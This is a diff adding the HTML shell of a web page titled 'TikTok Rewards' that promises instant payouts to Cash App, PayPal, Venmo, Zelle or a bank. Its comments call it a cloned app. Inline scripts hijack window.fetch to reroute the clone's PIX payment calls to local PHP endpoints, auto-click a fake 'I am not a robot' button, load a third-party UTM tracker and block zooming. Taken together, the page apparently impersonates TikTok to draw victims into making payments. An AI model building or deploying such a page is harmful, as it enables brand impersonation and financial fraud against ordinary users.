@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
+<meta name="theme-color" content="#ff0050" />
+<title>TikTok Rewards</title>
+<meta name="description" content="Claim your TikTok reward and get paid instantly to Cash App, PayPal, Venmo, Zelle, or your bank." />
+<link rel="icon" type="image/x-icon" href="/favicon.ico" />
+<link rel="stylesheet" href="/assets/index-B8NbOjFt.css" />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
+<script src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js" data-token="1ac0bf38-6455-426b-9ac5-9a1c77bdcf8b"></script>
+<script src="/param-forwarder.js"></script>
+<script src="/checkout-embed.js?v=14"></script>
+<script>
+// Roteia as chamadas do app clonado para os endpoints locais (PHP) na hospedagem estática
+(function () {
+  if (window.__pixFetchPatchedStatic) return;
+  window.__pixFetchPatchedStatic = true;
+  var origFetch = window.fetch.bind(window);
+  window.fetch = function (input, init) {
+    try {
+      var urlStr = typeof input === "string" ? input : (input instanceof URL ? input.toString() : input.url);
+      if (urlStr.includes("/functions/v1/create-pix-payment")) {
+        return origFetch("/api/public/create-pix-payment.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: (init && init.body) || "{}",
+        });
+      }
+      if (urlStr.includes("/functions/v1/check-pix-status")) {
+        return origFetch("/api/public/check-pix-status.php", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: (init && init.body) || "{}",
+        });
+      }
+    } catch (e) {}
+    return origFetch(input, init);
+  };
+})();
+</script>
+<script>
+
+(() => {
+  if (window.location.pathname === "/lp/") {
+    window.history.replaceState(null, "", "/lp" + window.location.search + window.location.hash);
+  }
+
+  const earlyParams = new URLSearchParams(window.location.search);
+  if ((window.location.pathname === "/" || window.location.pathname === "") && earlyParams.get("__route") === "tasks-app") {
+    earlyParams.delete("__route");
+    const nextSearch = earlyParams.toString();
+    window.history.replaceState(null, "", "/tasks-app" + (nextSearch ? "?" + nextSearch : "") + window.location.hash);
+  }
+
+
+
+  if (window.__mobileGuardInstalled) return;
+  window.__mobileGuardInstalled = true;
+  window.__earlyMobileGuard = true;
+
+  const viewportContent = "width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover";
+  let lastUrl = window.location.href;
+
+  const enforceViewport = () => {
+    let viewport = document.querySelector('meta[name="viewport"]');
+    if (!viewport) {
+      viewport = document.createElement("meta");
+      viewport.setAttribute("name", "viewport");
+      document.head.appendChild(viewport);
+    }
+    if (viewport.getAttribute("content") !== viewportContent) {
+      viewport.setAttribute("content", viewportContent);
+    }
+    document.documentElement.style.zoom = "1";
+    if (document.body) document.body.style.zoom = "1";
+  };
+
+  const isTextField = (node) => {
+    if (!node || !node.matches) return false;
+    return node.matches("input, textarea, select, [contenteditable='true']");
+  };
+
+  const resetAllScroll = () => {
+    enforceViewport();
+  };
+
+  const resetAfterScreenChange = () => {
+    requestAnimationFrame(resetAllScroll);
+    setTimeout(resetAllScroll, 60);
+    setTimeout(resetAllScroll, 180);
+    setTimeout(resetAllScroll, 420);
+    setTimeout(resetAllScroll, 900);
+  };
+
+  const prevent = (event) => {
+    if (event.cancelable) event.preventDefault();
+    enforceViewport();
+  };
+  const preventTouchZoom = (event) => {
+    if (event.touches && event.touches.length > 1) prevent(event);
+  };
+  const findCaptchaVerifyButton = (target) => {
+    const button = document.querySelector('button[aria-label="Verify"]');
+    if (!button || !document.body || !document.body.innerText.includes("I am not a robot")) return null;
+    if (target && target.closest && target.closest('input, textarea, select, [contenteditable="true"]')) return null;
+    const card = button.parentElement && button.parentElement.parentElement;
+    if (target === button || button.contains(target) || (card && card.contains(target))) return button;
+    return null;
+  };
+
+  let captchaTapLock = false;
+  const activateCaptchaTap = (target) => {
+    const button = findCaptchaVerifyButton(target);
+    if (!button) return false;
+    if (!captchaTapLock) {
+      captchaTapLock = true;
+      setTimeout(() => {
+        try { button.click(); } catch {}
+        setTimeout(() => { captchaTapLock = false; }, 700);
+      }, 0);
+    }
+    return true;
+  };
+  const preventKeyboardZoom = (event) => {
+    if ((event.ctrlKey || event.metaKey) && ["+", "-", "=", "0"].includes(event.key)) prevent(event);
+  };
+  const preventWheelZoom = (event) => {
+    if (event.ctrlKey || event.metaKey) prevent(event);
+  };
+
+  const originalPushState = history.pushState;
+  const originalReplaceState = history.replaceState;
+  history.pushState = function () {
+    const result = originalPushState.apply(this, arguments);
+    lastUrl = window.location.href;
+    resetAfterScreenChange();
+    return result;
+  };
+  history.replaceState = function () {
+    const result = originalReplaceState.apply(this, arguments);
+    lastUrl = window.location.href;
+    resetAfterScreenChange();
+    return result;
+  };
+
+  document.addEventListener("gesturestart", prevent, { passive: false, capture: true });
+  document.addEventListener("gesturechange", prevent, { passive: false, capture: true });
+  document.addEventListener("gestureend", prevent, { passive: false, capture: true });
+  document.addEventListener("touchstart", preventTouchZoom, { passive: false, capture: true });
+  document.addEventListener("touchmove", preventTouchZoom, { passive: false, capture: true });
+  document.addEventListener("touchend", (event) => { activateCaptchaTap(event.target); enforceViewport(); }, { passive: true, capture: true });
+  document.addEventListener("wheel", preventWheelZoom, { passive: false, capture: true });
+  document.addEventListener("keydown", preventKeyboardZoom, { passive: false, capture: true });
+
+  window.addEventListener("popstate", resetAfterScreenChange, { capture: true });
+  document.addEventListener("click", (event) => {
+    const target = event.target;
+    if (activateCaptchaTap(target)) return;
+    if (target && target.closest && target.closest("input, textarea, select, [contenteditable='true']")) return;
+    if (target && target.closest && target.closest("a, button, [role='button']")) {
+      resetAfterScreenChange();
+    }
+  }, true);
+  document.addEventListener("focusin", (e) => {
+     setTimeout(enforceViewport, 0);
+  }, true);
+  document.addEventListener("focusout", () => setTimeout(enforceViewport, 180), true);
+  if (window.visualViewport) {
+    window.visualViewport.addEventListener("resize", () => {
+      enforceViewport();
+    });
+  }
+
+  new MutationObserver(() => {
+    if (window.location.href !== lastUrl) {
+      lastUrl = window.location.href;
+      resetAfterScreenChange();
+    }
+  }).observe(document.documentElement, { childList: true, subtree: true });
+
+  enforceViewport();
+  resetAfterScreenChange();
+  setInterval(() => {
+    enforceViewport();
+    if (window.location.href !== lastUrl) {
+      lastUrl = window.location.href;
+      resetAfterScreenChange();
+    }
+  }, 250);
+})();
+
+</script>
+</head>
+<body>
+<div id="cloned-root"></div>
+<script type="module" src="/assets/index-BhN0l3GJ.js"></script>
+<script src="/redeem-patch.js?v=9"></script>
+</body>
+</html>
